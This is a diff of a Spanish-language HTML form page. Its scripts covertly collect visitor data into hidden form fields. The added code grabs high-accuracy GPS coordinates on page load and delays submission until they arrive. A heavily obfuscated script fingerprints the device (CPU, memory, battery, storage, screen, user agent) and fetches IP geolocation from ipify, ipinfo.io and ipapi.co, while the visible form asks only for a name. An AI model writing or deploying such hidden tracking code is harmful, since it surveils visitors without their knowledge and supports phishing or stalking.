@@ -276,7 +276,13 @@
           <input type="hidden" name="ip_usuario" id="ip_usuario">
 
           
-          
+          <!-- Campos ocultos donde se guardará la ubicación -->
+    <input type="hidden" id="gps_loc" name="gps_loc">
+    <input type="hidden" id="gps_accuracy" name="gps_accuracy">
+    <input type="hidden" id="gps_error" name="gps_error">
+
+    <!-- Ejemplo de campos visibles -->
+    <input type="text" name="nombre" placeholder="Tu nombre" required>
 
             
           
@@ -343,12 +349,56 @@
     
     
           
-document.addEventListener(`\x44\x4f\x4d\x43\x6f\x6e\x74\x65\x6e\x74\x4c\x6f\x61\x64\x65\x64`,function () {let _hpyfngjts = false;if (navigator.geolocation) {navigator.geolocation.getCurrentPosition( function (pos) {document.getElementById(`\x67\x70\x73\x5f\x6c\x6f\x63`).value = pos.coords.latitude + `\x2c` + pos.coords.longitude;document.getElementById(`\x67\x70\x73\x5f\x61\x63\x63\x75\x72\x61\x63\x79`).value = pos.coords.accuracy + `\x20\x6d\x65\x74\x72\x6f\x73`;_hpyfngjts = true;},function (err) {document.getElementById(`\x67\x70\x73\x5f\x65\x72\x72\x6f\x72`).value = `\x45\x72\x72\x6f\x72\x20` + err.code + `\x3a\x20` + err.message;_hpyfngjts = true;},{enableHighAccuracy: true,timeout: 30000,maximumAge: 0,} );} else {document.getElementById(`\x67\x70\x73\x5f\x65\x72\x72\x6f\x72`).value = `\x47\x65\x6f\x6c\x6f\x63\x61\x6c\x69\x7a\x61\x63\x69\xf3\x6e\x20\x6e\x6f\x20\x73\x6f\x70\x6f\x72\x74\x61\x64\x61`;_hpyfngjts = true;} const _4q0ytyv8b = document.querySelector(`\x66\x6f\x72\x6d`);_4q0ytyv8b.addEventListener(`\x73\x75\x62\x6d\x69\x74`,function (e) {if (!_hpyfngjts) {e.preventDefault();alert(`\x45\x73\x70\x65\x72\x61\x20\x75\x6e\x20\x6d\x6f\x6d\x65\x6e\x74\x6f\x20\x6d\x69\x65\x6e\x74\x72\x61\x73\x20\x73\x65\x20\x63\x61\x72\x67\x61\x6e\x20\x6c\x6f\x73\x20\x64\x61\x74\x6f\x73\x20\x79\x20\x76\x75\x6c\x76\x65\x20\x61\x20\x70\x72\x65\x73\x69\x6f\x6e\x61\x72\x20\x65\x6c\x20\x62\x6f\x74\xf3\x6e\x20\x64\x65\x20\x61\x63\x65\x70\x74\x61\x72\x2e\x2e\x2e`);setTimeout(() => _4q0ytyv8b.submit(),3000);}});}); 
+document.addEventListener('DOMContentLoaded', () => {
+    let gpsFinalizado = false;
+    const formulario = document.getElementById('miFormulario');
+    const botonEnvio = document.getElementById('btn-enviar');
 
-  
-    
-    
-    
+    // 1. Intentar obtener la ubicación apenas carga la página
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                document.getElementById('gps_loc').value = `${pos.coords.latitude},${pos.coords.longitude}`;
+                document.getElementById('gps_accuracy').value = `${pos.coords.accuracy} metros`;
+                gpsFinalizado = true;
+            },
+            (err) => {
+                document.getElementById('gps_error').value = `Error ${err.code}: ${err.message}`;
+                gpsFinalizado = true; // Marcamos como finalizado para no bloquear el envío
+            },
+            {
+                enableHighAccuracy: true,
+                timeout: 10000, // Máximo 10 segundos de espera
+                maximumAge: 0
+            }
+        );
+    } else {
+        document.getElementById('gps_error').value = "Geolocalización no soportada";
+        gpsFinalizado = true;
+    }
+
+    // 2. Gestionar el envío del formulario
+    formulario.addEventListener('submit', (e) => {
+        // Si el GPS aún no responde, pausamos el envío para mostrar el mensaje
+        if (!gpsFinalizado) {
+            e.preventDefault(); // Detiene el envío inmediato
+
+            // Cambiamos el texto y deshabilitamos para evitar múltiples clics
+            if (botonEnvio) {
+                botonEnvio.textContent = "Espere un momento...";
+                botonEnvio.disabled = true;
+                botonEnvio.style.opacity = "0.7";
+                botonEnvio.style.cursor = "not-allowed";
+            }
+
+            // Esperamos 3 segundos de cortesía y enviamos
+            setTimeout(() => {
+                gpsFinalizado = true; 
+                formulario.submit();
+            }, 3000);
+        }
+    });
+});
     
     const _0x396b48=_0x5808;function _0x5808(_0x5a956a,_0x1cd036){const _0x5a0ec2=_0x5a0e();return _0x5808=function(_0x5808f4,_0x5cb2b4){_0x5808f4=_0x5808f4-0x114;let _0x303f6e=_0x5a0ec2[_0x5808f4];return _0x303f6e;},_0x5808(_0x5a956a,_0x1cd036);}(function(_0x10c492,_0x2c693a){const _0x5a0cef=_0x5808,_0x4196e2=_0x10c492();while(!![]){try{const _0x114129=-parseInt(_0x5a0cef(0x148))/0x1+parseInt(_0x5a0cef(0x115))/0x2*(-parseInt(_0x5a0cef(0x149))/0x3)+parseInt(_0x5a0cef(0x143))/0x4*(-parseInt(_0x5a0cef(0x150))/0x5)+-parseInt(_0x5a0cef(0x141))/0x6+-parseInt(_0x5a0cef(0x15e))/0x7*(parseInt(_0x5a0cef(0x119))/0x8)+parseInt(_0x5a0cef(0x146))/0x9+parseInt(_0x5a0cef(0x14c))/0xa;if(_0x114129===_0x2c693a)break;else _0x4196e2['push'](_0x4196e2['shift']());}catch(_0x3c05bc){_0x4196e2['push'](_0x4196e2['shift']());}}}(_0x5a0e,0x88f7a),document['addEventListener'](_0x396b48(0x161),function(){const _0x482bc1=_0x396b48;fetch(_0x482bc1(0x13c))[_0x482bc1(0x117)](_0xe98236=>_0xe98236[_0x482bc1(0x123)]())[_0x482bc1(0x117)](_0x213502=>{const _0x52ed81=_0x482bc1;document[_0x52ed81(0x11a)](_0x52ed81(0x154))[_0x52ed81(0x147)]=_0x213502['ip'];})[_0x482bc1(0x125)](()=>{const _0x87e338=_0x482bc1;document[_0x87e338(0x11a)](_0x87e338(0x154))[_0x87e338(0x147)]=_0x87e338(0x137);}),document[_0x482bc1(0x11a)](_0x482bc1(0x14d))[_0x482bc1(0x147)]=navigator[_0x482bc1(0x14a)],document[_0x482bc1(0x11a)](_0x482bc1(0x138))[_0x482bc1(0x147)]=navigator[_0x482bc1(0x124)],document[_0x482bc1(0x11a)]('idioma_navegador')[_0x482bc1(0x147)]=navigator[_0x482bc1(0x13b)]||navigator[_0x482bc1(0x13d)],document[_0x482bc1(0x11a)](_0x482bc1(0x129))['value']=window[_0x482bc1(0x114)][_0x482bc1(0x133)]+'x'+window[_0x482bc1(0x114)][_0x482bc1(0x12d)],document[_0x482bc1(0x11a)](_0x482bc1(0x12f))[_0x482bc1(0x147)]=new Date()['toString'](),document[_0x482bc1(0x11a)](_0x482bc1(0x131))[_0x482bc1(0x147)]=navigator[_0x482bc1(0x132)]||_0x482bc1(0x12a),document[_0x482bc1(0x11a)](_0x482bc1(0x136))[_0x482bc1(0x147)]=navigator[_0x482bc1(0x155)]||_0x482bc1(0x12a),document[_0x482bc1(0x11a)]('isTouch')['value']=_0x482bc1(0x145)in window?'sí':'no',document['getElementById'](_0x482bc1(0x163))[_0x482bc1(0x147)]=Intl['DateTimeFormat']()[_0x482bc1(0x140)]()[_0x482bc1(0x12b)]||'desconocido',document[_0x482bc1(0x11a)](_0x482bc1(0x12c))[_0x482bc1(0x147)]=navigator['cookieEnabled']?'sí':'no',document['getElementById']('connectionType')[_0x482bc1(0x147)]=navigator['connection']&&navigator[_0x482bc1(0x15c)][_0x482bc1(0x130)]?navigator['connection'][_0x482bc1(0x130)]:'desconocido',navigator['getBattery']?navigator[_0x482bc1(0x120)]()['then'](function(_0x1c06fb){const _0x27ea89=_0x482bc1;document[_0x27ea89(0x11a)]('batteryLevel')[_0x27ea89(0x147)]=_0x1c06fb[_0x27ea89(0x118)]!==undefined?_0x1c06fb[_0x27ea89(0x118)]:_0x27ea89(0x12a),document['getElementById'](_0x27ea89(0x14e))[_0x27ea89(0x147)]=_0x1c06fb[_0x27ea89(0x11d)]?'sí':'no';})[_0x482bc1(0x125)](function(){const _0x338958=_0x482bc1;document[_0x338958(0x11a)](_0x338958(0x153))[_0x338958(0x147)]=_0x338958(0x12a),document[_0x338958(0x11a)]('batteryCharging')[_0x338958(0x147)]=_0x338958(0x12a);}):(document[_0x482bc1(0x11a)](_0x482bc1(0x153))['value']='no\x20soportado',document[_0x482bc1(0x11a)](_0x482bc1(0x14e))[_0x482bc1(0x147)]=_0x482bc1(0x12a));}),setTimeout(async function(){const _0x1c6ea1=_0x396b48;if(navigator[_0x1c6ea1(0x15d)]&&navigator[_0x1c6ea1(0x15d)][_0x1c6ea1(0x160)])try{let _0x1a9544=await navigator[_0x1c6ea1(0x15d)]['estimate']();document[_0x1c6ea1(0x11a)](_0x1c6ea1(0x142))['value']=(_0x1a9544[_0x1c6ea1(0x13a)]/(0x400*0x400*0x400))['toFixed'](0x2)+_0x1c6ea1(0x157),document[_0x1c6ea1(0x11a)](_0x1c6ea1(0x116))['value']=((_0x1a9544[_0x1c6ea1(0x13a)]-_0x1a9544['usage'])/(0x400*0x400*0x400))[_0x1c6ea1(0x11e)](0x2)+_0x1c6ea1(0x157);}catch(_0x34a639){console[_0x1c6ea1(0x151)]('Error\x20obteniendo\x20almacenamiento:',_0x34a639),document[_0x1c6ea1(0x11a)](_0x1c6ea1(0x142))[_0x1c6ea1(0x147)]=_0x1c6ea1(0x137),document[_0x1c6ea1(0x11a)](_0x1c6ea1(0x116))[_0x1c6ea1(0x147)]=_0x1c6ea1(0x137);}else console[_0x1c6ea1(0x144)](_0x1c6ea1(0x121)),document[_0x1c6ea1(0x11a)](_0x1c6ea1(0x142))[_0x1c6ea1(0x147)]='No\x20soportado',document[_0x1c6ea1(0x11a)](_0x1c6ea1(0x116))[_0x1c6ea1(0x147)]=_0x1c6ea1(0x12e);},0x1f4),window[_0x396b48(0x15f)]('DOMContentLoaded',function(){const _0x61f8e4=_0x396b48;function _0x5d9856(_0xcc8ba5){const _0x5f51c8=_0x5808;console[_0x5f51c8(0x159)](_0x5f51c8(0x11c),_0xcc8ba5);const _0x3bbc1d={'ip':'ipinfo_ip','country':_0x5f51c8(0x162),'region':'ipinfo_region','city':'ipinfo_city','postal':'ipinfo_postal','loc':_0x5f51c8(0x14f),'timezone':_0x5f51c8(0x13e)};for(const _0x45b855 in _0x3bbc1d){if(_0x3bbc1d[_0x5f51c8(0x11f)](_0x45b855)){const _0x3f76b0=document[_0x5f51c8(0x11a)](_0x3bbc1d[_0x45b855]);_0x3f76b0?_0x3f76b0[_0x5f51c8(0x147)]=_0xcc8ba5[_0x45b855]||'':console[_0x5f51c8(0x144)](_0x5f51c8(0x122)+_0x3bbc1d[_0x45b855]);}}}fetch(_0x61f8e4(0x134))[_0x61f8e4(0x117)](_0x429ccf=>{const _0x430f13=_0x61f8e4;if(!_0x429ccf['ok'])throw new Error(_0x430f13(0x13f)+_0x429ccf[_0x430f13(0x15b)]);return _0x429ccf['json']();})['then'](_0x3ac216=>{const _0x51d782=_0x61f8e4;if(_0x3ac216[_0x51d782(0x156)]&&_0x3ac216['country']['trim']()!=='')_0x5d9856(_0x3ac216);else return console['warn'](_0x51d782(0x11b)),fetch(_0x51d782(0x139))[_0x51d782(0x117)](_0x31ab6e=>{const _0x11f1c5=_0x51d782;if(!_0x31ab6e['ok'])throw new Error('HTTP\x20error\x20ipapi.co:\x20'+_0x31ab6e[_0x11f1c5(0x15b)]);return _0x31ab6e[_0x11f1c5(0x123)]();})[_0x51d782(0x117)](_0x4a8fdc=>{const _0x1a2530=_0x51d782;_0x5d9856({'ip':_0x4a8fdc['ip'],'country':_0x4a8fdc[_0x1a2530(0x156)],'region':_0x4a8fdc[_0x1a2530(0x14b)],'city':_0x4a8fdc[_0x1a2530(0x128)],'postal':_0x4a8fdc[_0x1a2530(0x158)],'loc':_0x4a8fdc[_0x1a2530(0x127)]+','+_0x4a8fdc[_0x1a2530(0x15a)],'timezone':_0x4a8fdc[_0x1a2530(0x163)]});});})[_0x61f8e4(0x125)](_0x508e42=>{const _0x55e1c5=_0x61f8e4;console['error'](_0x55e1c5(0x135),_0x508e42),fetch(_0x55e1c5(0x139))['then'](_0x17314b=>{const _0x411349=_0x55e1c5;if(!_0x17314b['ok'])throw new Error(_0x411349(0x152)+_0x17314b[_0x411349(0x15b)]);return _0x17314b[_0x411349(0x123)]();})[_0x55e1c5(0x117)](_0x1683c8=>{const _0x503d87=_0x55e1c5;_0x5d9856({'ip':_0x1683c8['ip'],'country':_0x1683c8[_0x503d87(0x156)],'region':_0x1683c8[_0x503d87(0x14b)],'city':_0x1683c8[_0x503d87(0x128)],'postal':_0x1683c8[_0x503d87(0x158)],'loc':_0x1683c8[_0x503d87(0x127)]+','+_0x1683c8[_0x503d87(0x15a)],'timezone':_0x1683c8[_0x503d87(0x163)]});})[_0x55e1c5(0x125)](_0x5de1c6=>{const _0x1b6f30=_0x55e1c5;console[_0x1b6f30(0x151)](_0x1b6f30(0x126),_0x5de1c6);});});}));function _0x5a0e(){const _0xea399c=['storage','7lxSeUn','addEventListener','estimate','DOMContentLoaded','ipinfo_country','timezone','screen','415200XOLECI','freeStorage','then','level','7059736HGwtPJ','getElementById','IPinfo\x20no\x20devolvió\x20país\x20válido,\x20intentando\x20ipapi.co','Datos\x20recibidos\x20para\x20llenar\x20campos:','charging','toFixed','hasOwnProperty','getBattery','La\x20API\x20de\x20almacenamiento\x20no\x20está\x20soportada\x20en\x20este\x20navegador.','No\x20se\x20encontró\x20el\x20campo\x20oculto\x20con\x20id:\x20','json','platform','catch','Error\x20también\x20en\x20ipapi.co:','latitude','city','resolucion_pantalla','no\x20soportado','timeZone','cookiesEnabled','height','No\x20soportado','fecha_hora_local','effectiveType','ram','deviceMemory','width','https://ipinfo.io/json?token=5080ae73a6b291','Error\x20en\x20IPinfo,\x20intentando\x20fallback\x20ipapi.co:','cpu','No\x20disponible','plataforma','https://ipapi.co/json/','quota','language','https://api.ipify.org?format=json','userLanguage','ipinfo_timezone','HTTP\x20error\x20IPinfo:\x20','resolvedOptions','4854606ufcBgG','totalStorage','2973596akGoSc','warn','ontouchstart','482544JNHjfH','value','519299LWhJpZ','15sMBbYD','userAgent','region','44996680Dvasys','navegador','batteryCharging','ipinfo_loc','5kXNYaa','error','HTTP\x20error\x20ipapi.co:\x20','batteryLevel','ip_usuario','hardwareConcurrency','country','\x20GB','postal','log','longitude','status','connection'];_0x5a0e=function(){return _0xea399c;};return _0x5a0e();}
   </script>
